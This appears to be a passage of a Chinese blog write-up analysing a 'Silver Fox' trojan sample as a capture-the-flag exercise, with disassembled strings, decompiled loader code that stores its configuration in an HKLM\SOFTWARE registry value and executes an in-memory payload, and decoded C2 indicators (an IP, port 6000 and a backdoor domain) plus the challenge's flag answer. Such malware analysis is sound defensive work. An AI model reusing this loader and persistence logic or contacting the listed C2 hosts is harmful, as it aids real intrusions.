class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">data:000000014001DBB8 aRoLdBytes      db &#x27;[RO] %ld bytes&#x27;,0   ; DATA XREF: sub_140001740+2E↑o</span><br><span class="line">.rdata:000000014001DBB8                                         ; sub_140002880+14A↑o ...</span><br><span class="line">.rdata:000000014001DBC7                 align 8</span><br><span class="line">.rdata:000000014001DBC8 aRecvSnLu       db &#x27;recv sn=%lu&#x27;,0      ; DATA XREF: sub_140001B70+FF↑o</span><br><span class="line">.rdata:000000014001DBD4                 align 8</span><br><span class="line">.rdata:000000014001DBD8 aRiDBytes       db &#x27;[RI] %d bytes&#x27;,0    ; DATA XREF: sub_140002390+3A↑o</span><br><span class="line">.rdata:000000014001DBE6                 align 8</span><br><span class="line">.rdata:000000014001DBE8 aInputAckSnLuRt db &#x27;input ack: sn=%lu rtt=%ld rto=%ld&#x27;,0</span><br><span class="line">.rdata:000000014001DBE8                                         ; DATA XREF: sub_140002390+271↑o</span><br><span class="line">.rdata:000000014001DC0A                 align 10h</span><br><span class="line">.rdata:000000014001DC10 aInputPshSnLuTs db &#x27;input psh: sn=%lu ts=%lu&#x27;,0</span><br><span class="line">.rdata:000000014001DC10                                         ; DATA XREF: sub_140002390+2AE↑o</span><br><span class="line">.rdata:000000014001DC29                 align 10h</span><br><span class="line">.rdata:000000014001DC30 aInputProbe     db &#x27;input probe&#x27;,0      ; DATA XREF: sub_140002390+375↑o</span><br><span class="line">.rdata:000000014001DC3C                 align 20h</span><br><span class="line">.rdata:000000014001DC40 aInputWinsLu    db &#x27;input wins: %lu&#x27;,0  ; DATA XREF: sub_140002390+39E↑o</span><br><span class="line">.rdata:000000014001DC50                 dq offset ??_R4CManager@@6B@ ; const CManager::`RTTI Complete Object Locator&#x27;</span><br><span class="line">.rdata:000000014001DC58 ; const CManager::`vftable&#x27;</span><br><span class="line">.rdata:000000014001DC58 ??_7CManager@@6B@ dq offset nullsub_2   ; DATA XREF: sub_140006E50+27↑o</span><br><span class="line">.rdata:000000014001DC58                                         ; sub_140006EB0+21↑o ...</span><br><span class="line">.rdata:000000014001DC60                 dq offset ??_R4CTcpSocket@@6B@ ; const CTcpSocket::`RTTI Complete Object Locator&#x27;</span><br><span class="line">.rdata:000000014001DC68 ; const CTcpSocket::`vftable&#x27;</span><br><span class="line">.rdata:000000014001DC68 ??_7CTcpSocket@@6B@ dq offset sub_140003310</span><br><span class="line">.rdata:000000014001DC68                                         ; DATA XREF: sub_140003230+21↑o</span><br><span class="line">.rdata:000000014001DC70                 dq offset sub_140005A30</span><br><span class="line">.rdata:000000014001DC78                 dq offset sub_140003860</span><br><span class="line">.rdata:000000014001DC80                 dq offset ?swfun@std@@YAXAEAVios_base@1@_J@Z ; std::swfun(std::ios_base &amp;,__int64)</span><br><span class="line">.rdata:000000014001DC88                 dq offset sub_140003390</span><br><span class="line">.rdata:000000014001DC90                 dq offset sub_140003C10</span><br><span class="line">.rdata:000000014001DC98 unk_14001DC98   db    0                 ; DATA XREF: sub_140009460+61↑o</span><br><span class="line">.rdata:000000014001DC99                 db    0</span><br><span class="line">.rdata:000000014001DC9A                 db    0</span><br><span class="line">.rdata:000000014001DC9B                 db    0</span><br><span class="line">.rdata:000000014001DC9C                 db    0</span><br><span class="line">.rdata:000000014001DC9D                 db    0</span><br><span class="line">.rdata:000000014001DC9E                 db    0</span><br><span class="line">.rdata:000000014001DC9F                 db    0</span><br><span class="line">.rdata:000000014001DCA0 aInvalidStringP db &#x27;invalid string position&#x27;,0</span><br><span class="line">.rdata:000000014001DCA0                                         ; DATA XREF: sub_1400066C0+1C↑o</span><br><span class="line">.rdata:000000014001DCA0                                         ; sub_1400067F0+27↑o ...</span><br><span class="line">.rdata:000000014001DCB8 aStringTooLong  db &#x27;string too long&#x27;,0  ; DATA XREF: sub_1400067F0+71↑o</span><br><span class="line">.rdata:000000014001DCB8                                         ; sub_140006920+8D↑o ...</span><br><span class="line">.rdata:000000014001DCC8                 align 10h</span><br><span class="line">.rdata:000000014001DCD0 ; const WCHAR aD33f351a4aeea5</span><br><span class="line">.rdata:000000014001DCD0 aD33f351a4aeea5:                        ; DATA XREF: sub_140006EF0+8D↑o</span><br><span class="line">.rdata:000000014001DCD0                                         ; sub_140006EF0+F2↑o ...</span><br><span class="line">.rdata:000000014001DCD0                 text &quot;UTF-16LE&quot;, &#x27;d33f351a4aeea5e608853d1a56661059&#x27;,0</span><br><span class="line">.rdata:000000014001DD12                 align 8</span><br><span class="line">.rdata:000000014001DD18 aDenglupeizhi   db &#x27;denglupeizhi&#x27;,0     ; DATA XREF: sub_140007500+23↑o</span><br><span class="line">.rdata:000000014001DD25                 align 8</span><br><span class="line">.rdata:000000014001DD28 ; const WCHAR SubKey</span><br><span class="line">.rdata:000000014001DD28 SubKey:                                 ; DATA XREF: sub_140006D20+40↑o</span><br><span class="line">.rdata:000000014001DD28                 text &quot;UTF-16LE&quot;, &#x27;SOFTWARE&#x27;,0</span><br><span class="line">.rdata:000000014001DD3A                 align 20h</span><br><span class="line">.rdata:000000014001DD40 ; const WCHAR ValueName</span><br><span class="line">.rdata:000000014001DD40 ValueName:                              ; DATA XREF: sub_140006D20+67↑o</span><br><span class="line">.rdata:000000014001DD40                                         ; sub_140006D20+79↑o</span><br><span class="line">.rdata:000000014001DD40                 text &quot;UTF-16LE&quot;, &#x27;IpDates_info&#x27;,0</span><br><span class="line">.rdata:000000014001DD5A                 align 20h</span><br><span class="line">.rdata:000000014001DD60 ; const WCHAR aConsole1</span><br><span class="line">.rdata:000000014001DD60 aConsole1:                              ; DATA XREF: sub_140006EF0+39↑o</span><br><span class="line">.rdata:000000014001DD60                                         ; sub_140006EF0+367↑o</span><br><span class="line">.rdata:000000014001DD60                 text &quot;UTF-16LE&quot;, &#x27;Console\1&#x27;,0</span><br><span class="line">.rdata:000000014001DD74                 align 8</span><br><span class="line">.rdata:000000014001DD78 aWindowsSystem3 db &#x27;Windows\System32\tracerpt.exe&#x27;,0</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902341-4ab60a55-51cc-4e69-8d07-3b895e7e7c13.jpg" referrerpolicy="no-referrer" alt="null"><br><code>denglupeizhi</code>（中文拼音：「登录配置」）</p>
<ul>
<li><p>含义：程序的核心配置项（大概率存储 C2 服务器 IP、端口、登录密码 &#x2F; 密钥）；</p>
</li>
<li><p>排查操作：在系统中搜索这个字符串（如注册表、本地配置文件），可能找到明文 &#x2F; 加密的 C2 配置。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_140007500(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // r10d</span><br><span class="line">  __int64 v2; // r9</span><br><span class="line">  int n12_1; // r8d</span><br><span class="line">  __int64 n12; // rdx</span><br><span class="line"></span><br><span class="line">  v1 = 0;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  if ( a1 &lt;= 0 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    n12_1 = 0;</span><br><span class="line">    for ( n12 = 0; n12 &lt; 12; ++n12 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *((_BYTE *)lpBuffer + v2 + n12) != aDenglupeizhi[n12] )</span><br><span class="line">        break;</span><br><span class="line">      ++n12_1;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( n12_1 == 12 )</span><br><span class="line">      break;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">    if ( v2 &gt;= a1 )</span><br><span class="line">      return 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  return v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数也挺关键的</p>
<p>然后xfer到下面这个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_140006D20(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  HANDLE hProcess; // rax</span><br><span class="line">  _QWORD v5[2]; // [rsp+30h] [rbp-28h] BYREF</span><br><span class="line">  DWORD dwProcessId[6]; // [rsp+40h] [rbp-18h]</span><br><span class="line">  DWORD ExitCode; // [rsp+60h] [rbp+8h] BYREF</span><br><span class="line">  HKEY hKey; // [rsp+68h] [rbp+10h] BYREF</span><br><span class="line"></span><br><span class="line">  v2 = sub_140007500(dword_14005EBB8);</span><br><span class="line">  if ( v2 != -1 )</span><br><span class="line">    memmove((char *)lpBuffer + v2, &amp;Src, 0x12A0u);</span><br><span class="line">  RegOpenKeyExW(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE&quot;, 0, 0x102u, &amp;hKey);</span><br><span class="line">  RegDeleteValueW(hKey, L&quot;IpDates_info&quot;);</span><br><span class="line">  RegSetValueExW(hKey, L&quot;IpDates_info&quot;, 0, 3u, &amp;Src, 0x12A0u);</span><br><span class="line">  RegCloseKey(hKey);</span><br><span class="line">  if ( a1[10] )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[0] = 0;</span><br><span class="line">    v5[1] = 0;</span><br><span class="line">    *(_QWORD *)dwProcessId = 0;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( !(unsigned int)sub_140007310((unsigned int)dword_14005EBB8, v5) )</span><br><span class="line">        ;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        hProcess = OpenProcess(0x400u, 0, dwProcessId[0]);</span><br><span class="line">        if ( !hProcess || !GetExitCodeProcess(hProcess, &amp;ExitCode) || ExitCode != 259 )</span><br><span class="line">          break;</span><br><span class="line">        Sleep(0xBB8u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((void (*)(void))lpBuffer)();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码负责配置的更新与持久化，又负责核心恶意代码的执行，是整个攻击链条的关键</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动 → 读取旧配置（IpDates_info）→ 调用sub_140007500查找配置位置 → 用Src更新配置 → 写入注册表持久化 → 监控目标进程状态 → 执行核心恶意代码（C2连接+攻击）</span><br></pre></td></tr></table></figure>

<p>由下面这个就可以去查一下注册表了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902450-dee17387-9078-4dba-944d-368cc4c0bb15.jpg" referrerpolicy="no-referrer" alt="null"><br>这里查注册表发现了ipdateinfo<br>在HKEY_LOCAL_MACHINE\SOFTWARE发现了信息这就很关键了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902554-c3a44855-dc22-41c7-b175-5c366e768832.jpg" referrerpolicy="no-referrer" alt="null"></p>
<p>这里导出来看一眼，注册表文件内容转成txt了，怕你们乱点给自己电脑搞坏了，那估计只能重装了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902643-8f722f11-c6d0-4b0c-ae35-81ce43b9e0af.jpg" referrerpolicy="no-referrer" alt="null"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902754-c4c5a70f-f5e0-4098-9e7c-76ecf6cdb1ee.png" referrerpolicy="no-referrer" alt="null"><br>注册表数据是 <strong>UTF-16LE 编码</strong>（Windows 注册表字符串默认编码），大量 <code>00</code> 是编码空字节，关键信息如下：</p>
<table>
<thead>
<tr>
<th>解码后的明文信息</th>
<th>对应十六进制片段（示例）</th>
<th>含义（木马配置作用）</th>
</tr>
</thead>
<tbody><tr>
<td><code>115.190.102.32</code></td>
<td><code>31,00,31,00,35,00,2e,00,31,00,39,00,30,00,2e,00,31,00,30,00,32,00,2e,00,33,00,32,00</code></td>
<td>木马的 <strong>C2 服务器 IP</strong>，就是我的远程服务器</td>
</tr>
<tr>
<td><code>6000</code></td>
<td><code>36,00,30,00,30,00,30,00</code></td>
<td>C2 服务器的 <strong>监听端口</strong>，对应 TCP 连接的 <code>6000</code> 端口，是木马和黑客通信的核心端口</td>
</tr>
<tr>
<td><code>127.0.0.1</code></td>
<td><code>31,00,32,00,37,00,2e,00,30,00,2e,00,30,00,2e,00,31,00</code></td>
<td>木马的 <strong>本地监听 IP</strong>（回环地址），估计是用于本地进程通信或反向代理（隐藏自身行为）</td>
</tr>
<tr>
<td><code>80</code></td>
<td><code>38,00,30,00</code></td>
<td>本地监听端口（80 端口，模拟 HTTP 服务，规避防火墙检测）</td>
</tr>
<tr>
<td><code>1.0</code></td>
<td><code>31,00,2e,00,30,00</code></td>
<td>木马版本号（简单标识版本，无特殊技术意义）</td>
</tr>
<tr>
<td><code>2025.11. 9</code></td>
<td><code>32,00,30,00,32,00,35,00,2e,00,31,00,31,00,2e,00,20,00,39,00</code></td>
<td>配置更新日期（生成配置的时间，用于版本管理）</td>
</tr>
<tr>
<td><code>1</code>（多个零散出现）</td>
<td><code>01,00,00,00</code> 或 <code>31,00</code></td>
<td>功能开关（对应之前逆向的 <code>dword_14005F6A8</code> 等变量，<code>1=启用</code>，比如启用 C2 连接、本地监听）</td>
</tr>
</tbody></table>
<p>这里可以看到日期</p>
<p>当然这分析出来的只是服务器IP并不是真正的后门IP，这也可以作为木马分析1的题解，面对找不到进程或者任何关于木马的特征的情况可以这样操作，可以这样分析</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902941-8e048307-f7d3-44b8-b446-ae9dc2b62915.png" referrerpolicy="no-referrer" alt="null"><br>去看一眼开机自启动注册表没发现什么奇怪的</p>
<p>shift+F12<br>然后搜索到了.com的域名，这个很大可能就是开发c2工具的黑产团伙留下的后门域名，我们查一下域名<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903017-838718d8-0ac0-488d-83d4-06cb054e5af4.jpg" referrerpolicy="no-referrer" alt="null"></p>
<p>直接问ai懒得搜了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903125-1a1114ff-50e9-40b0-a374-a14d8e47ac0b.jpg" referrerpolicy="no-referrer" alt="null"></p>
<p>yk.ggdy.com</p>
<p>md5值：af71b4482bc8e659e1c2a092a910d4ec</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903222-9f8bbb75-d1a8-4656-951c-561d5481711a.jpg" referrerpolicy="no-referrer" alt="null"></p>
<p>所以最终flag就是{yk.ggdy.com:2025年11月9日}</p>
<p>最后查一下这个IP在哪里</p>
<p><a target="_blank" rel="noopener" href="https://ipconfig.com/zh">https://ipconfig.com/zh</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903351-31bebb75-85d6-4d9d-b8e2-e216d2e39ba2.jpg" referrerpolicy="no-referrer" alt="null"></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>银狐木马样本深度分析与后门域名溯源</p><p><a href="https://flypigc.github.io/2025/12/11/银狐木马分析/">https://flypigc.github.io/2025/12/11/银狐木马分析/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Sky</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-12-11</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2025-12-20</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=6938dd3470fd5d0337653de1&amp;product=sop" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" referrerpolicy="no-referrer" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" referrerpolicy="no-referrer" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2025/12/11/js%E5%86%85%E5%AD%98%E9%A9%AC-CVE-2025-55182/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">js内存马-CVE-2025-55182</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/12/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA+METASPLOITABLE%E6%89%93%E9%9D%B6/"><span class="level-item">红日靶场+METASPLOITABLE打靶</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">评论</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
            this.page.url = 'https://flypigc.github.io/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/';
            this.page.identifier = '2025/12/11/银狐木马分析/';
        };
        (function() {
            var d = document, s = d.createElement('script');  
            s.src = '//' + 'https-flypigc-github-io' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-3-desktop is-3-widescreen  order-3"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" referrerpolicy="no-referrer" alt="Sky"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sky</p><p class="is-size-6 is-block">网络安全技术研究 | CTF竞赛解析 | 漏洞复现分析 | 红队渗透</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Hunan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">24</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/flypigc" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/flypigc"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="QQ" href="https://cdn.nlark.com/yuque/0/2025/jpeg/62156892/1766078784961-f9376350-bae6-460e-8b24-81a34063b413.jpeg"><i class="fab fa-qq"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="WeChat" href="https://cdn.nlark.com/yuque/0/2025/jpeg/62156892/1766078785044-f1c1fa04-de3c-42ca-95e2-d48e3410636b.jpeg"><i class="fab fa-weixin"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" referrerpolicy="no-referrer" alt="Sky&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 Sky</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2025</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>